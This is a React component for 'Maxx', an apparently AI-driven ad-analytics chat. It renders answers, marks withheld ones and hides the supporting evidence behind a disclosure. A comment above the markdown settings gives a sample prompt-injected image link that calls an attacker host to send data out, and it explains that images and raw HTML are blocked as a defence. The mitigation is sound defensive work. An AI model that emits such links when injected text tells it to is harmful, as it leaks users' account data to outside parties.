'use client'

import { safeHref } from '@/lib/ui/safe-href'
import { useState, useRef, useEffect, useCallback } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import { Bot, ArrowUp, ShieldCheck, ShieldAlert, ChevronRight } from 'lucide-react'
import { MaxxEvidenceNotice } from './MaxxEvidenceNotice'
import { outcomeNoun } from '@/config/outcome-nouns'
import { splitAnswerSections } from '@/lib/maxx/answer-sections'
import type { ChatCard } from '@/lib/maxx/chat-cards'
import { ChatCards } from './MaxxChatCards'

export type Turn = { role: 'user' | 'assistant'; content: string; tools?: string[]; withheld?: boolean; cards?: ChatCard[] }

/**
 * The response → turn mapping, and the assistant bubble, are exported so they can be TESTED.
 *
 * They were inline, and the test written to cover them re-implemented the mapping inside the test
 * file instead of importing anything — so setting `withheld` to a constant `false` here, which
 * removes the "Answer withheld" badge from every withheld answer, left the whole suite green. A
 * component with hooks and a fetch loop cannot be driven to this state by `renderToStaticMarkup`;
 * the answer is to make the parts that carry the behaviour importable rather than to assert on a
 * copy of them.
 */
export function turnFromResponse(data: { text: string; toolsUsed?: string[]; availability?: string; cards?: ChatCard[] }): Turn {
  return {
    role: 'assistant',
    content: data.text,
    tools: data.toolsUsed,
    // A withheld answer arrives 200 with `availability: 'unavailable'` and composed text saying WHY.
    // It is an answer about the evidence, not a failed request, so it renders as an assistant turn.
    // The red error banner stays for transport failures only — it cannot say which lookup failed or
    // which plane had no claim supply, and painting refusals with it is what hid every one of those
    // explanations from this surface.
    withheld: data.availability === 'unavailable',
    // ADR-062: an owner action's card (copy, a plan draft, a pending proposal). Never on an answer.
    ...(Array.isArray(data.cards) && data.cards.length > 0 ? { cards: data.cards } : {}),
  }
}

export function AssistantTurn({ turn }: { turn: Turn }) {
  return (
    <div style={{ alignSelf: 'flex-start', maxWidth: '92%' }}>
      <div style={{ background: 'var(--bg-surface)', border: `1px solid ${turn.withheld ? 'var(--warning-border)' : 'var(--border)'}`, borderRadius: 12, padding: '11px 14px', color: 'var(--text-secondary)' }}>
        {turn.withheld && (
          <p style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, fontWeight: 600, letterSpacing: '0.03em', textTransform: 'uppercase', color: 'var(--warning)', margin: '0 0 8px' }}>
            <ShieldAlert className="w-3.5 h-3.5" aria-hidden />
            Answer withheld
          </p>
        )}
        <AnswerBody content={turn.content} />
      </div>
      {turn.cards && <ChatCards cards={turn.cards} />}
      {turn.tools && turn.tools.length > 0 && (
        <p style={{ fontSize: 10.5, color: 'var(--text-disabled)', marginTop: 5, paddingLeft: 4 }}>
          Checked: {turn.tools.map((x) => x.replace(/_/g, ' ').replace(/^get /, '')).join(' · ')}
        </p>
      )}
    </div>
  )
}

function Markdown({ children }: { children: string }) {
  return <ReactMarkdown components={MD} skipHtml disallowedElements={MARKDOWN_DISALLOWED}>{children}</ReactMarkdown>
}

/**
 * Summary first, evidence on request. A governed answer carries an evidence heading; everything after
 * it renders inside a native disclosure, closed by default. `<details>`/`<summary>` is keyboard
 * operable (Enter/Space) and announced as an expandable control without any script, and the evidence
 * stays in the DOM so find-in-page and copy still reach it. Text without the heading renders whole.
 */
export function AnswerBody({ content }: { content: string }) {
  const { lead, evidenceLabel, evidence } = splitAnswerSections(content)
  if (evidence === null || evidenceLabel === null) return <Markdown>{content}</Markdown>
  return (
    <>
      {lead && <Markdown>{lead}</Markdown>}
      <details data-answer-evidence className="group" style={{ marginTop: 4, borderTop: '1px solid var(--border)', paddingTop: 6 }}>
        <summary className="focus-visible:outline-2 focus-visible:outline-offset-2" style={{ cursor: 'pointer', fontSize: 12.5, fontWeight: 600, color: 'var(--text-tertiary)', minHeight: 44, display: 'flex', alignItems: 'center', gap: 4 }}>
          <ChevronRight className="w-3.5 h-3.5 transition-transform group-open:rotate-90" aria-hidden />
          {evidenceLabel}
        </summary>
        <div style={{ paddingTop: 6 }}>
          <Markdown>{evidence}</Markdown>
        </div>
      </details>
    </>
  )
}

const STARTERS = [
  'How are the ads doing right now?',
  'What should I do today?',
  `Is my ${outcomeNoun({ plural: false })} attribution trustworthy?`,
  'What has Maxx learned so far?',
]

// Model output is untrusted. An image URL is fetched with no click, so a prompt-injected
// `![](https://attacker/?d=…)` would exfiltrate data; images are dropped and raw HTML is skipped.
const MARKDOWN_DISALLOWED = ['img']

const MD: Components = {
  p: ({ children }) => <p style={{ margin: '0 0 8px', fontSize: 13.5, lineHeight: 1.6 }}>{children}</p>,
  strong: ({ children }) => <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{children}</strong>,
  ul: ({ children }) => <ul style={{ margin: '0 0 8px', paddingLeft: 18, display: 'flex', flexDirection: 'column', gap: 3 }}>{children}</ul>,
  ol: ({ children }) => <ol style={{ margin: '0 0 8px', paddingLeft: 18, display: 'flex', flexDirection: 'column', gap: 3 }}>{children}</ol>,
  li: ({ children }) => <li style={{ fontSize: 13.5, lineHeight: 1.55 }}>{children}</li>,
  code: ({ children }) => <code style={{ background: 'var(--bg-subtle)', borderRadius: 4, padding: '1px 5px', fontSize: 12.5 }}>{children}</code>,
  a: ({ children, href }) => {
    const safe = safeHref(href)
    return safe
      ? <a href={safe} target="_blank" rel="noopener noreferrer nofollow" style={{ color: 'var(--accent)', textDecoration: 'none' }}>{children}</a>
      : <span>{children}</span>
  },
}

/** The chat's standing notice: read-only and governed, condensed to one line with the details on request. */
export function GovernanceLine() {
  return (
    <details data-governance-line className="group" style={{ flexShrink: 0, padding: '6px 4px', marginBottom: 4 }}>
      <summary style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 6, cursor: 'pointer', minHeight: 44, fontSize: 11.5, color: 'var(--text-tertiary)' }}>
        <ShieldCheck className="w-3.5 h-3.5" style={{ color: 'var(--success)' }} aria-hidden />
        <span>Answers come only from governed account evidence. Maxx can draft copy, plans and proposals; only you approve a change, on the Changes page.</span>
        <span style={{ color: 'var(--accent)', textDecoration: 'underline', textUnderlineOffset: 3 }}>How Maxx answers</span>
      </summary>
      <div style={{ marginTop: 6 }}>
        <MaxxEvidenceNotice compact />
      </div>
    </details>
  )
}

export function MaxxChat() {
  const [turns, setTurns] = useState<Turn[]>([])
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const scrollRef = useRef<HTMLDivElement>(null)
  const taRef = useRef<HTMLTextAreaElement>(null)

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: 'smooth' })
  }, [turns, loading])

  const send = useCallback(async (text: string) => {
    const q = text.trim()
    if (!q || loading) return
    setError(null)
    const next: Turn[] = [...turns, { role: 'user', content: q }]
    setTurns(next)
    setInput('')
    setLoading(true)
    try {
      const res = await fetch('/api/maxx/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ messages: next.map((t) => ({ role: t.role, content: t.content })) }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error ?? 'Maxx could not answer')
      setTurns((prev) => [...prev, turnFromResponse(data)])
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Something went wrong')
    } finally {
      setLoading(false)
    }
  }, [turns, loading])

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', minHeight: 0 }}>
      {/* Read-only guardrail — one line, persistent; the full answer contract is one click away. */}
      <GovernanceLine />

      {/* Thread */}
      <div ref={scrollRef} style={{ flex: 1, overflowY: 'auto', minHeight: 0, display: 'flex', flexDirection: 'column', gap: 14, padding: '8px 2px' }}>
        {turns.length === 0 && !loading && (
          <div style={{ margin: 'auto 0', textAlign: 'center', padding: '12px 8px' }}>
            <div style={{ width: 40, height: 40, borderRadius: 10, background: 'var(--accent-dim)', border: '1px solid var(--border-focus)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 12px' }}>
              <Bot className="w-5 h-5" style={{ color: 'var(--accent)' }} />
            </div>
            <p style={{ fontSize: 14, fontWeight: 600, color: 'var(--text-primary)', marginBottom: 4 }}>Ask Maxx anything about the account</p>
            <p style={{ fontSize: 12.5, color: 'var(--text-tertiary)', marginBottom: 16 }}>Grounded in your live Meta + GA4 data, with estimates and blocked attribution labeled.</p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8, maxWidth: 360, margin: '0 auto' }}>
              {STARTERS.map((s) => (
                <button
                  key={s}
                  onClick={() => send(s)}
                  style={{ textAlign: 'left', fontSize: 13, color: 'var(--text-secondary)', background: 'var(--bg-surface)', border: '1px solid var(--border)', borderRadius: 8, padding: '9px 12px', cursor: 'pointer' }}
                >
                  {s}
                </button>
              ))}
            </div>
          </div>
        )}

        {turns.map((t, i) =>
          t.role === 'user' ? (
            <div key={i} style={{ alignSelf: 'flex-end', maxWidth: '85%', background: 'var(--accent-dim)', border: '1px solid var(--border-focus)', borderRadius: 12, padding: '9px 13px', fontSize: 13.5, lineHeight: 1.5, color: 'var(--text-primary)' }}>
              {t.content}
            </div>
          ) : (
            <AssistantTurn key={i} turn={t} />
          ),
        )}

        {loading && (
          <div style={{ alignSelf: 'flex-start', display: 'flex', alignItems: 'center', gap: 8, color: 'var(--text-tertiary)', fontSize: 12.5, padding: '4px 2px' }}>
            <span className="animate-pulse" style={{ width: 7, height: 7, borderRadius: 999, background: 'var(--accent)' }} />
            Maxx is reading the account…
          </div>
        )}

        {error && (
          <div style={{ alignSelf: 'flex-start', fontSize: 12.5, color: 'var(--danger)', background: 'var(--danger-bg)', border: '1px solid var(--danger-border)', borderRadius: 8, padding: '8px 12px' }}>
            {error}
          </div>
        )}
      </div>

      {/* Composer */}
      <div style={{ flexShrink: 0, paddingTop: 10 }}>
        <div style={{ display: 'flex', alignItems: 'flex-end', gap: 8, background: 'var(--bg-input)', border: '1px solid var(--border)', borderRadius: 12, padding: '8px 8px 8px 12px' }}>
          <textarea
            ref={taRef}
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault()
                void send(input)
              }
            }}
            rows={1}
            placeholder="Ask about performance, attribution, recommendations…"
            style={{ flex: 1, resize: 'none', border: 'none', outline: 'none', background: 'transparent', fontSize: 13.5, lineHeight: 1.5, color: 'var(--text-primary)', maxHeight: 120, paddingTop: 4 }}
          />
          <button
            onClick={() => void send(input)}
            disabled={loading || !input.trim()}
            aria-label="Send"
            style={{ flexShrink: 0, width: 44, height: 44, borderRadius: 10, background: input.trim() && !loading ? 'var(--accent)' : 'var(--bg-subtle)', color: input.trim() && !loading ? '#fff' : 'var(--text-disabled)', border: 'none', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: input.trim() && !loading ? 'pointer' : 'default', transition: 'background 120ms' }}
          >
            <ArrowUp className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  )
}
